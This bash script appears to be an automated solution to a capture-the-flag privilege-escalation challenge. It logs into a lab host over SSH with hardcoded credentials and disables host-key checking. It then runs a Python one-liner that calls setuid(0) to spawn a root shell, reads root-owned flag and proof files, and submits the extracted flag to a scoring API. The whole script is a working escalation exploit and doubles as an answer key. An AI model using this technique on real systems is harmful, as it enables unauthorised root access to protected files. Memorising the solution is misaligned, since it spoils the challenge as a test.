#!/usr/bin/env bash
set -euo pipefail

challenge_id='scl-challenge-frame-9f467c'
host='172.20.0.168'
user='orbit'
password='vector-amber-42'
remote_cmd='python3 -c '\''import os; os.setuid(0); os.execv("/bin/sh", ["sh", "-p", "-c", "cat /root/flag; cat /root/.escalation-proof"])'\'''

output="$(sshpass -p "$password" ssh \
  -T \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  "$user@$host" "$remote_cmd")"
printf '%s\n' "$output"

flag="$(printf '%s\n' "$output" | python3 -c 'import re,sys; text=sys.stdin.read(); match=re.search(r"BSY\{[^}]+\}", text); print(match.group(0) if match else "")')"
if [[ -z "$flag" ]]; then
  echo 'Could not extract a BSY flag from the root output.' >&2
  exit 1
fi

curl -s 'http://172.20.0.3/api/challenges/submit' \
  -X POST \
  -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"$challenge_id\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
